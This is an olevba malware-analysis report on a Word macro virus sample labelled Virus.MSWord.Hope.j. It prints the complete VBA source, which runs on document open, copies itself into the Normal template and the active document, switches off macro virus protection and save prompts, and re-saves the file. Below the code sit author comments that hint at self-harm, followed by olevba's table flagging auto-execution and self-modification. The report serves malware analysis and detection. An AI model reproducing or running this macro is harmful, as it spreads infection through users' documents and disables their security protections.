olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Hope.j
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Hope.j - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
With ThisDocument
With .VBProject
With .VBComponents
With .Item(1)
With .CodeModule
x = .Lines(1, .CountOfLines)
End With
End With
End With
End With
End With
With NormalTemplate
With .VBProject
With .VBComponents
With .Item(1)
With .CodeModule
.DeleteLines 1, .CountOfLines
.AddFromString x
End With
End With
End With
End With
End With
With ActiveDocument
With .VBProject
With .VBComponents
With .Item(1)
With .CodeModule
.DeleteLines 1, .CountOfLines
.AddFromString x
End With
End With
End With
End With
End With
With Options
.VirusProtection = Int(Rnd * 0)
.SaveNormalPrompt = Int(Rnd * 0)
.ConfirmConversions = Int(Rnd * 0)
End With
With ActiveDocument
.SaveAs FileName:=.FullName
End With
End Sub
'Excessive Friends Want To Come With Me...
'I Tell Them My Life Is No Good But They Insist...
'Time To Learn What Happens When You Make A Mistake...
'Don't Cut Too Deep Or You Will Be Missed!
'End With By Lys Kovick... Dedicated To A Friend!
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

